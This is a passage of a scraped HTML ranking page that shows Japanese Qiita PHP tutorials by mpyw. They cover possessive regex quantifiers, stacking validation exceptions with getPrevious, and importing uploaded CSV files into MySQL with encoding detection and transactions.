<tr>
<th style="text-align: center"><strong>最短マッチ</strong></th>
<th style="text-align: center"><strong>最長マッチ</strong></th>
<th style="text-align: center"><strong>独占的最長マッチ</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">??</td>
<td style="text-align: center">?</td>
<td style="text-align: center">?+</td>
</tr>
<tr>
<td style="text-align: center">*?</td>
<td style="text-align: center">*</td>
<td style="text-align: center">*+</td>
</tr>
<tr>
<td style="text-align: center">+?</td>
<td style="text-align: center">+</td>
<td style="text-align: center">++</td>
</tr>
<tr>
<td style="text-align: center">{3, 8}?</td>
<td style="text-align: center">{3,8}</td>
<td style="text-align: center">{3,8}+</td>
</tr>
<tr>
<td style="text-align: center">{5,}?</td>
<td style="text-align: center">{5,}</td>
<td style="text-align: center">{5,}+</td>
</tr>
</tbody>
</table>

<p><strong>【例】</strong></p>

<p><code>ABCDE123EFG45</code></p>

<p>のような文字列の末尾の数字のみを削除して</p>

<p><code>ABCDE123EFG</code></p>

<p>のようにしたい</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">最長マッチで実行</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="s1">'ABCDE123EFG45'</span><span class="p">;</span>
<span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\\d+\\z/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</pre></div>
</div>

<ol>
<li> <code>1</code>  にマッチし、次の文字を調べる。</li>
<li> <code>12</code> にマッチし、次の文字を調べる。</li>
<li> <code>123</code> にマッチし、ここで <code>\d+</code> のマッチはいったん終了する。</li>
<li> <code>123</code> のときこの場所は <code>\z</code> にはマッチしないので、バックトラックを行う。</li>
<li> <code>12</code> のときこの場所は <code>\z</code> にはマッチしないので、バックトラックを行う。</li>
<li> <code>1</code> のときこの場所は <code>\z</code> にはマッチしない。よってここはマッチ失敗とする。</li>
<li> <code>4</code> にマッチし、次の文字を調べる。</li>
<li> <code>45</code> にマッチし、ここで <code>\d+</code> のマッチはいったん終了する。</li>
<li> <code>45</code> のときこの場所は <code>\z</code> にはマッチする。よってここはマッチ成功とする。</li>
</ol>

<p>このように最長マッチだと無駄にバックトラックが行われてパフォーマンスが低下してしまいますが、代わりに <strong>独占的最長マッチ</strong> を用いると・・・</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">独占的最長マッチで実行</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="s1">'ABCDE123EFG45'</span><span class="p">;</span>
<span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\\d++\\z/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</pre></div>
</div>

<ol>
<li> <code>1</code>  にマッチし、次の文字を調べる。</li>
<li> <code>12</code> にマッチし、次の文字を調べる。</li>
<li> <code>123</code> にマッチし、ここで <code>\d+</code> のマッチは終了する。</li>
<li> この場所は <code>\z</code> にはマッチしない。よってここはマッチ失敗とする。</li>
<li> <code>4</code> にマッチし、次の文字を調べる。</li>
<li> <code>45</code> にマッチし、ここで <code>\d+</code> のマッチは終了する。</li>
<li> この場所は <code>\z</code> にはマッチする。よってここはマッチ成功とする。</li>
</ol>

<p>このように無駄なバックトラックを防ぐことが出来ます。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />9位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>191</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/6bd99ff62571c02feaa1">[PHP] まとめて例外をスローする小技</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-03 03:19:51</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[例外]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="基本編" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E7%B7%A8"><i class="fa fa-link"></i></a>基本編</h1>

<p>簡略化のために <code>die</code> を用いて説明するが、例えば入力フォームでバリデーションを行うとき、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">try</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">'名前が未入力です'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">'メールアドレスが未入力です'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
<span class="p">}</span>
</pre></div></div>

<p>のようなロジックがあるとする。これでは<ins>名前が未入力のときにメールアドレスのチェックを行わない</ins>。それを避けて、どちらもチェックしたいようにするときは</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$errors</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'名前が未入力です'</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'メールアドレスが未入力です'</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$errors</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s2">"&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$errors</span><span class="p">));</span>
<span class="p">}</span>
</pre></div></div>

<p>というように <code>Exception</code> を使った処理を諦めている人が多いのではないだろうか？しかしこれだとMVCフレームワークを使った開発では、モデルにバリデーション処理を吸収させづらくなり、渋々コントローラを肥大化させるはめになるのではないかと思う。そこでこれを解決する案を素人なりに考えてみた。</p>

<p><strong>PHP5.3以降</strong> であれば、 <strong><a href="http://php.net/manual/ja/exception.getprevious.php" rel="nofollow noopener" target="_blank">Exception::getPrevious()</a></strong> メソッドにより、例外をスタックとして積んでいくことができる。今回はこれを利用する。</p>

<p>毎回 <code>Exception</code> のコンストラクタを呼ぶのは面倒なので、関数を作る。この関数ではインスタンスを作るだけで、<ins>スローは行っていない</ins>。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$message</span><span class="p">,</span> <span class="nv">$previous</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="nv">$message</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$previous</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>更に、例外スタックから順次取り出して配列に変換する関数を作る。スタックの性質故に逆順になることを避ける為、最後に <strong><a href="http://www.php.net/manual/ja/function.array-reverse.php" rel="nofollow noopener" target="_blank">array_reverse</a></strong> 関数を通している。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">exception_to_array</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
    <span class="k">return</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$errors</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>これらを使って最初のロジックはこう書き換えることが出来る。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">try</span> <span class="p">{</span>
    <span class="nv">$e</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'名前が未入力です'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'メールアドレスが未入力です'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s2">"&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nx">exception_to_array</span><span class="p">(</span><span class="nv">$e</span><span class="p">)));</span>
<span class="p">}</span>
</pre></div></div>

<p>どうだろうか？これだけでも随分MVCに基づいた設計がしやすくなった（と私は思う）。</p>

<p>これを利用して、初心者向けにドットインストールで開講されている講座 <strong><a href="http://dotinstall.com/lessons/sns_php_v2" rel="nofollow noopener" target="_blank">「ユーザー管理をするWebサービスを作ろう」</a></strong> を自分の納得の行くように書き換えてみた。今回は <strong>「フレームワークを使わないけどフレームワークっぽいことを手軽に実装する」</strong> ことを目標としてみた。</p>

<p><strong><a href="https://github.com/Certainist/sns_php" rel="nofollow noopener" target="_blank">GitHub - sns_php</a></strong></p>

<h1>
<span id="応用編" class="fragment"></span><a href="#%E5%BF%9C%E7%94%A8%E7%B7%A8"><i class="fa fa-link"></i></a>応用編</h1>

<h2>
<span id="e-の初期化を不要にする" class="fragment"></span><a href="#e-%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96%E3%82%92%E4%B8%8D%E8%A6%81%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><code>$e</code> の初期化を不要にする</h2>

<p>参照渡しにすればNoticeを発生せずに自動的にNULLとして初期化される性質を利用する。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$message</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$previous</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="nv">$message</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$previous</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">try</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'名前が未入力です'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'メールアドレスが未入力です'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s2">"&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nx">exception_to_array</span><span class="p">(</span><span class="nv">$e</span><span class="p">)));</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="自作例外クラスを-traversable-にする" class="fragment"></span><a href="#%E8%87%AA%E4%BD%9C%E4%BE%8B%E5%A4%96%E3%82%AF%E3%83%A9%E3%82%B9%E3%82%92-traversable-%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>自作例外クラスを <strong>Traversable</strong> にする</h2>

<p>このクラスを継承させると、 <code>exception_to_array</code> 関数を通さなくても直接 <code>$e</code> をforeachにかけて反復処理させることが出来る。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">TraversableException</span> <span class="k">extends</span> <span class="nx">RuntimeException</span> <span class="k">implements</span> <span class="nx">IteratorAggregate</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">getIterator</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$e</span> <span class="o">=</span> <span class="nv">$this</span><span class="p">;</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$e</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nx">ArrayIterator</span><span class="p">(</span><span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$array</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="runtimeexception-クラスを-traversable-にする" class="fragment"></span><a href="#runtimeexception-%E3%82%AF%E3%83%A9%E3%82%B9%E3%82%92-traversable-%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>RuntimeException</strong> クラスを <strong>Traversable</strong> にする</h2>

<p><strong><a href="http://www.php.net/manual/ja/book.runkit.php" rel="nofollow noopener" target="_blank">Runkit</a></strong> を用いた超大型反則技。あらゆる実行時例外をforeachを用いて処理できるようになる。これはやってみる価値あるんじゃないかと。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">abstract</span> <span class="k">class</span> <span class="nc">TraversableException</span> <span class="k">extends</span> <span class="nx">Exception</span> <span class="k">implements</span> <span class="nx">IteratorAggregate</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">getIterator</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$e</span> <span class="o">=</span> <span class="nv">$this</span><span class="p">;</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$e</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nx">ArrayIterator</span><span class="p">(</span><span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$array</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nb">runkit_class_adopt</span><span class="p">(</span><span class="s1">'RuntimeException'</span><span class="p">,</span> <span class="s1">'TraversableException'</span><span class="p">);</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />10位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>167</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/caa2568284b69d270f8b">CSVアップロードからのMySQLへのデータ挿入</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-03-20 14:57:28</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[MySQL]</b> <b>[CSV]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a><strong>前書き</strong>
</h1>

<p>まだ <strong><a href="http://qiita.com/mpyw/items/939964377766a54d4682" id="reference-1bc0c98107266b87ff6e">「ファイルアップロードの例外処理はこれぐらいしないと気が済まない」</a></strong> や  <strong><a href="http://qiita.com/mpyw/items/b00b72c5c95aac573b71" id="reference-ab8e7fc506fa795e1bdb">「PHPでデータベースに接続するときのまとめ」</a></strong> をご覧になっていない方は先にそちらからどうぞ。</p>

<p>…もうこのシリーズ何番煎じだよって感じになってきましたが、気にせず書きますｗｗｗ</p>

<h1>
<span id="実装のポイント" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a><strong>実装のポイント</strong>
</h1>

<h2>
<span id="ファイルアップロード段階でエラーが発生した場合にも適切に対応する" class="fragment"></span><a href="#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89%E6%AE%B5%E9%9A%8E%E3%81%A7%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%97%E3%81%9F%E5%A0%B4%E5%90%88%E3%81%AB%E3%82%82%E9%81%A9%E5%88%87%E3%81%AB%E5%AF%BE%E5%BF%9C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>ファイルアップロード段階でエラーが発生した場合にも適切に対応する</strong>
</h2>

<p>このシリーズ共通の目標です。</p>

<h2>
<span id="csvファイルのmimeタイプは判定できない" class="fragment"></span><a href="#csv%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AEmime%E3%82%BF%E3%82%A4%E3%83%97%E3%81%AF%E5%88%A4%E5%AE%9A%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a><strong>CSVファイルのMIMEタイプは判定できない</strong>
</h2>

<p>実は <strong><a href="http://www.php.net/manual/ja/function.finfo-file.php" rel="nofollow noopener" target="_blank">finfo::file</a></strong> メソッドを使って判定しようとすると <code>text/csv</code> とはならず、どう頑張っても <strong><code>text/plain</code></strong> にしかなりません。というわけでこの方法は断念せざるを得ません。これ以降、 <strong>文字コードの厳密な判定</strong> や <strong>CSVとして正しく読み取れたかどうか</strong> などのチェックを交えることによって、ここで実現出来なかった判定に代えようと試みることにします。</p>

<h2>
<span id="アップロードされたファイルの文字コードを確実にutf-8に変換する" class="fragment"></span><a href="#%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89%E3%81%95%E3%82%8C%E3%81%9F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E6%96%87%E5%AD%97%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E7%A2%BA%E5%AE%9F%E3%81%AButf-8%E3%81%AB%E5%A4%89%E6%8F%9B%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>アップロードされたファイルの文字コードを確実にUTF-8に変換する</strong>
</h2>

<p>CSVファイルと言えども、いろいろな環境で作成されたものがあるでしょう。そういった <strong>文字コードがよく分からないもの</strong> を全て無難に扱えるUTF-8に変換するためには、 <strong><a href="http://www.php.net/manual/ja/function.mb-convert-encoding.php" rel="nofollow noopener" target="_blank">mb_convert_encoding</a></strong> を利用する際、php.iniの設定に依存する自動判定の <code>auto</code> は使用せずに</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">日本語ファイルの文字コードを正確に判定できる順番</span></div>
<div class="highlight"><pre><span></span>ASCII,JIS,UTF-8,CP51932,SJIS-win
</pre></div>
</div>

<p>と明示するほうが望ましいです。更に、 <strong><a href="http://www.php.net/manual/ja/function.mb-convert-encoding.php" rel="nofollow noopener" target="_blank">mb_convert_encoding</a></strong> をすぐには使わず、 <em>\$strict</em> を <code>true</code> に指定した <strong><a href="http://www.php.net/manual/ja/function.mb-detect-encoding.php" rel="nofollow noopener" target="_blank">mb_detect_encoding</a></strong> を併用することで正確性を最大限に引き上げられます。</p>

<h2>
<span id="トランザクション処理を行う" class="fragment"></span><a href="#%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B6%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E5%87%A6%E7%90%86%E3%82%92%E8%A1%8C%E3%81%86"><i class="fa fa-link"></i></a><strong>トランザクション処理を行う</strong>
</h2>

<p>途中でエラーが発生したとき、後から前に行った処理を取り消しできるように <strong>トランザクション処理</strong> を行うべきでしょう。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">トランザクション処理のひな形</span></div>
<div class="highlight"><pre><span></span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">beginTransaction</span><span class="p">();</span> <span class="c1">// トランザクション処理を開始する</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="cm">/* ここで目的の処理を行う */</span>
    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">commit</span><span class="p">();</span> <span class="c1">// 行った処理をすべて反映する</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">rollBack</span><span class="p">();</span> <span class="c1">// 行った処理をすべて取り消しする</span>
    <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span> <span class="c1">// 外側に例外を引き継ぐ</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="fgetcsv-関数を正しく使う" class="fragment"></span><a href="#fgetcsv-%E9%96%A2%E6%95%B0%E3%82%92%E6%AD%A3%E3%81%97%E3%81%8F%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a><strong><a href="http://www.php.net/manual/ja/function.fgetcsv.php" rel="nofollow noopener" target="_blank">fgetcsv</a> 関数を正しく使う</strong>
</h2>

<p>以下のようにファイル終端に到達して <code>false</code> が返されるまでの間ループを続けさせます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">fgetcsv</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
    <span class="cm">/* ここで各行に対する処理を行う */</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="ロケールを設定する" class="fragment"></span><a href="#%E3%83%AD%E3%82%B1%E3%83%BC%E3%83%AB%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>ロケールを設定する</strong>
</h3>

<p>PHP5では <strong><a href="http://www.php.net/manual/ja/function.setlocale.php" rel="nofollow noopener" target="_blank">setlocale</a></strong> 関数を用いて以下を実行しておかないと文字化けが発生するリスクがあります。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">setlocale</span><span class="p">(</span><span class="nx">LC_ALL</span><span class="p">,</span> <span class="s1">'ja_JP.UTF-8'</span><span class="p">);</span>
</pre></div></div>

<h3>
<span id="途中の空行を検知する" class="fragment"></span><a href="#%E9%80%94%E4%B8%AD%E3%81%AE%E7%A9%BA%E8%A1%8C%E3%82%92%E6%A4%9C%E7%9F%A5%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>途中の空行を検知する</strong>
</h3>

<p>最終行以外の空行は <code>array(null)</code> として取り出されるので、これが見つかった場合はその行はスキップさせるべきでしょう。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">===</span> <span class="k">array</span><span class="p">(</span><span class="k">null</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// 空行はスキップ</span>
    <span class="k">continue</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>但し、PHP5.3.7より古いバージョンには <strong>バグ</strong> があります。</p>

<table>
<thead>
<tr>
<th style="text-align: center"></th>
<th style="text-align: center">～ 5.2.9</th>
<th style="text-align: center">5.2.10 ～ 5.3.6</th>
<th style="text-align: center">5.3.7 ～</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">
<code>""</code><br>(空文字列)</td>
<td style="text-align: center"><code>array("")</code></td>
<td style="text-align: center"><code>array(null)</code></td>
<td style="text-align: center"><code>array(null)</code></td>
</tr>
<tr>
<td style="text-align: center">
<code>" "</code><br>(半角スペース)</td>
<td style="text-align: center"><code>array("")</code></td>
<td style="text-align: center"><code>array(null)</code></td>
<td style="text-align: center"><code>array(" ")</code></td>
</tr>
</tbody>
</table>

<h3>
<span id="エラーとファイルの終端を区別して検知する" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%A8%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E7%B5%82%E7%AB%AF%E3%82%92%E5%8C%BA%E5%88%A5%E3%81%97%E3%81%A6%E6%A4%9C%E7%9F%A5%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>エラーとファイルの終端を区別して検知する</strong>
</h3>

<p><strong><a href="http://www.php.net/manual/ja/function.fgetcsv.php" rel="nofollow noopener" target="_blank">fgetcsv</a></strong> 関数が配列以外の値を返す条件は以下のようになります。</p>

<p><a href="https://camo.qiitausercontent.com/9a5516a88ad483fd41cf6c5ae98863acc9b49745/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f31303961343861362d303666392d366334622d346332632d3562633233643739376430362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9a5516a88ad483fd41cf6c5ae98863acc9b49745/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f31303961343861362d303666392d366334622d346332632d3562633233643739376430362e706e67" alt="ss (2014-04-26 at 10.55.39).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/109a48a6-06f9-6c4b-4c2c-5bc23d797d06.png"></a></p>

<p>これらは <strong><a href="http://www.php.net/manual/ja/function.feof.php" rel="nofollow noopener" target="_blank">feof</a></strong> 関数によって区別することが出来ます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
    <span class="c1">// ファイルポインタが終端に達していなければエラー</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'CSV parsing error'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="カラム数の整合性をチェックする" class="fragment"></span><a href="#%E3%82%AB%E3%83%A9%E3%83%A0%E6%95%B0%E3%81%AE%E6%95%B4%E5%90%88%E6%80%A7%E3%82%92%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>カラム数の整合性をチェックする</strong>
</h3>

